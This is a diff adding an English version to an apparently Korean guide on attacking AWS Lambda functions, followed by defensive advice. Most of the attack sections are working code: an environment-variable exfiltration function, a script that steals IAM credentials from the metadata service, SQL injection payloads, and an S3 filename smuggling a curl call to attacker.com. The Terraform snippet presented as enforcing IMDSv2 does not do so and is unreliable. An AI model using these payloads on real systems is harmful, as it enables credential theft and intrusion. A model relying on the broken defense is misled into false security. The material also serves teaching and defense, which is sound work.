@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # AWS Lambda 함수 공격 기법
 
 ## 1. 서버리스 위협 모델
@@ -309,3 +315,319 @@ def lambda_handler(event, context):
 | 레이어 | 레이어 권한 최소화 |
 | 코드 서명 | Code Signing Config 적용 |
 | 감사 로그 | CloudTrail + CloudWatch Logs 활성화 |
+
+---
+
+<a name="english"></a>
+
+# AWS Lambda Function Attack Techniques
+
+## 1. Serverless Threat Model
+
+Serverless environments reduce infrastructure management overhead, but introduce new attack surfaces in execution contexts, environment variables, IAM roles, and event sources.
+
+| Attack Vector | Description |
+|-----------|------|
+| Environment Variable Exfiltration | Exposure of API keys, DB credentials, and secrets |
+| Overprivileged IAM Role | Using Lambda role to access other AWS services |
+| SSRF → Metadata Service | Obtaining temporary IAM credentials via IMDSv1 |
+| Dependency Injection | npm/pip package typosquatting |
+| Event Injection | Injection via event sources (SQS, S3, API Gateway) |
+| Timeout Attack | Long-running executions causing cost/availability attacks |
+| Cold Start Race | Timing attacks against initialization logic |
+
+---
+
+## 2. Environment Variable Exfiltration
+
+If Lambda function code has an RCE vulnerability, environment variables can be read directly.
+
+```python
+# Dump environment variables from inside Lambda (post-RCE)
+import os, json, urllib.request
+
+def exfiltrate_env(exfil_url: str) -> None:
+    env_vars = dict(os.environ)
+    # Prioritize credential-related keys
+    sensitive = {k: v for k, v in env_vars.items()
+                 if any(kw in k.upper() for kw in
+                        ["KEY", "SECRET", "TOKEN", "PASS", "DB", "CREDENTIAL"])}
+    data = json.dumps(sensitive).encode()
+    req = urllib.request.Request(exfil_url, data=data, method="POST")
+    urllib.request.urlopen(req, timeout=5)
+```
+
+### 2.1 Accessing /proc/environ
+
+```bash
+# Reading /proc/1/environ from Lambda runtime (requires RCE)
+cat /proc/1/environ | tr '\0' '\n'
+cat /proc/self/environ | tr '\0' '\n' | grep -E "AWS|SECRET|KEY|TOKEN"
+```
+
+---
+
+## 3. SSRF → AWS Metadata Service (IMDSv1)
+
+```python
+#!/usr/bin/env python3
+"""Simulator for IAM credential exfiltration via SSRF in Lambda environments.
+
+Demonstrates real-world Lambda SSRF scenarios for CTF/educational purposes.
+Does not work in environments with IMDSv2 (token-based) enforced.
+"""
+
+import argparse
+import json
+import urllib.request
+import urllib.error
+
+
+METADATA_BASE = "http://169.254.169.254/latest"
+
+
+def fetch_metadata(path: str, timeout: int = 3) -> str | None:
+    try:
+        url = f"{METADATA_BASE}/{path}"
+        with urllib.request.urlopen(url, timeout=timeout) as resp:
+            return resp.read().decode()
+    except (urllib.error.URLError, OSError):
+        return None
+
+
+def get_iam_credentials() -> dict | None:
+    role_name = fetch_metadata("meta-data/iam/security-credentials/")
+    if not role_name:
+        print("[-] IMDSv1 not accessible (IMDSv2 enforced or metadata service disabled)")
+        return None
+
+    role_name = role_name.strip()
+    print(f"[+] IAM role found: {role_name}")
+
+    creds_json = fetch_metadata(f"meta-data/iam/security-credentials/{role_name}")
+    if not creds_json:
+        return None
+
+    creds = json.loads(creds_json)
+    return {
+        "RoleName": role_name,
+        "AccessKeyId": creds.get("AccessKeyId"),
+        "SecretAccessKey": creds.get("SecretAccessKey"),
+        "Token": creds.get("Token"),
+        "Expiration": creds.get("Expiration"),
+    }
+
+
+def check_imdsv2(timeout: int = 3) -> bool:
+    """Check whether IMDSv2 is enforced."""
+    try:
+        req = urllib.request.Request(
+            f"{METADATA_BASE}/api/token",
+            method="PUT",
+            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
+        )
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            token = resp.read().decode()
+            return bool(token)
+    except Exception:
+        return False
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="AWS Metadata Service vulnerability assessment (educational)")
+    parser.add_argument("--check-only", action="store_true", help="Only check whether IMDSv2 is enforced")
+    parser.add_argument("-o", "--output", help="Path to save results")
+    args = parser.parse_args()
+
+    imdsv2 = check_imdsv2()
+    print(f"[*] IMDSv2 enforced: {'Yes (protected)' if imdsv2 else 'No (vulnerable)'}")
+
+    if args.check_only or imdsv2:
+        return
+
+    creds = get_iam_credentials()
+    if creds:
+        print(f"[+] AccessKeyId: {creds['AccessKeyId']}")
+        print(f"[+] Expiration: {creds['Expiration']}")
+        if args.output:
+            with open(args.output, "w") as f:
+                json.dump(creds, f, indent=2)
+            print(f"Results saved: {args.output}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 4. Lambda Event Injection
+
+### 4.1 API Gateway Event Manipulation
+
+```python
+# Example API Gateway → Lambda event structure
+event = {
+    "httpMethod": "POST",
+    "path": "/api/query",
+    "headers": {"Authorization": "Bearer TOKEN"},
+    "body": '{"query": "1; DROP TABLE users--"}',  # SQL injection
+    "queryStringParameters": {
+        "page": "1 UNION SELECT username,password FROM admin--"
+    }
+}
+
+# Vulnerable Lambda handler (susceptible to injection)
+def handler_vulnerable(event, context):
+    import sqlite3
+    page = event["queryStringParameters"]["page"]
+    conn = sqlite3.connect("/tmp/db.sqlite3")
+    # Dangerous: direct format string — SQLi vulnerable
+    results = conn.execute(f"SELECT * FROM items WHERE id = {page}").fetchall()
+    return {"statusCode": 200, "body": str(results)}
+
+# Safe handler
+def handler_safe(event, context):
+    import sqlite3
+    page = event["queryStringParameters"].get("page", "1")
+    if not page.isdigit():
+        return {"statusCode": 400, "body": "Invalid page parameter"}
+    conn = sqlite3.connect("/tmp/db.sqlite3")
+    results = conn.execute("SELECT * FROM items WHERE id = ?", (int(page),)).fetchall()
+    return {"statusCode": 200, "body": str(results)}
+```
+
+### 4.2 S3 Event Trigger Manipulation
+
+```bash
+# Lambda trigger manipulation via S3 events
+# Inserting special characters in filenames → command injection during Lambda processing
+aws s3 cp payload.zip "s3://target-bucket/$(curl attacker.com/$(whoami)).zip"
+
+# Triggering Lambda timeout with large files (cost DoS)
+dd if=/dev/zero bs=1M count=500 | aws s3 cp - s3://target-bucket/large-file.bin
+```
+
+---
+
+## 5. Lambda Runtime Fingerprinting
+
+```python
+#!/usr/bin/env python3
+"""Lambda runtime environment information gathering — for security audits."""
+
+import os
+import json
+import platform
+import subprocess
+from pathlib import Path
+
+
+def collect_runtime_info() -> dict:
+    info: dict = {}
+
+    # Lambda environment variables
+    lambda_vars = [
+        "AWS_REGION", "AWS_DEFAULT_REGION", "AWS_LAMBDA_FUNCTION_NAME",
+        "AWS_LAMBDA_FUNCTION_VERSION", "AWS_LAMBDA_FUNCTION_MEMORY_SIZE",
+        "AWS_LAMBDA_LOG_GROUP_NAME", "AWS_EXECUTION_ENV",
+        "LAMBDA_RUNTIME_DIR", "LAMBDA_TASK_ROOT",
+        "_HANDLER", "AWS_LAMBDA_RUNTIME_API",
+    ]
+    info["lambda_env"] = {k: os.environ.get(k, "N/A") for k in lambda_vars}
+
+    # System information
+    info["platform"] = {
+        "system": platform.system(),
+        "machine": platform.machine(),
+        "python_version": platform.python_version(),
+    }
+
+    # Check /tmp writability
+    try:
+        test_file = Path("/tmp/.test")
+        test_file.write_text("test")
+        test_file.unlink()
+        info["tmp_writable"] = True
+    except OSError:
+        info["tmp_writable"] = False
+
+    # Check /proc accessibility
+    info["proc_accessible"] = Path("/proc/self/status").exists()
+
+    # Network interfaces
+    try:
+        result = subprocess.run(
+            ["ip", "addr"], capture_output=True, text=True, timeout=5
+        )
+        info["network"] = result.stdout[:500]
+    except Exception:
+        info["network"] = "Not accessible"
+
+    return info
+
+
+def lambda_handler(event: dict, context) -> dict:
+    info = collect_runtime_info()
+    return {
+        "statusCode": 200,
+        "body": json.dumps(info, indent=2, ensure_ascii=False),
+    }
+```
+
+---
+
+## 6. Defense Techniques
+
+### 6.1 Enforcing IMDSv2
+
+```bash
+# Force EC2 Instance Metadata Service v2 (Lambda defaults to IMDSv2)
+aws ec2 modify-instance-metadata-options \
+  --instance-id i-xxxxxxxx \
+  --http-tokens required \
+  --http-endpoint enabled
+
+# Enforce Lambda IMDSv2 via Terraform
+resource "aws_lambda_function" "secure" {
+  # ...
+  ephemeral_storage { size = 512 }
+}
+```
+
+### 6.2 Using AWS Secrets Manager Instead of Environment Variables
+
+```python
+import boto3
+import json
+from functools import cache
+
+@cache
+def get_secret(secret_name: str) -> dict:
+    client = boto3.client("secretsmanager", region_name="ap-northeast-2")
+    response = client.get_secret_value(SecretId=secret_name)
+    return json.loads(response["SecretString"])
+
+def lambda_handler(event, context):
+    # Use Secrets Manager instead of environment variables
+    db_creds = get_secret("prod/myapp/database")
+    db_password = db_creds["password"]
+    # ...
+```
+
+---
+
+## 7. Lambda Security Checklist
+
+| Item | Recommended Setting |
+|------|-----------|
+| IAM Role | Principle of least privilege — allow only required services |
+| Environment Variables | Enable KMS encryption |
+| Secrets | Use Secrets Manager / Parameter Store |
+| VPC | Place inside VPC when accessing sensitive resources |
+| IMDSv2 | Always enforce |
+| Timeout | Set appropriate limits (default 3s, max 15 minutes) |
+| Concurrency | Use Reserved Concurrency to prevent DoS |
+| Layers | Minimize layer permissions |
+| Code Signing | Apply Code Signing Config |
+| Audit Logs | Enable CloudTrail + CloudWatch Logs |
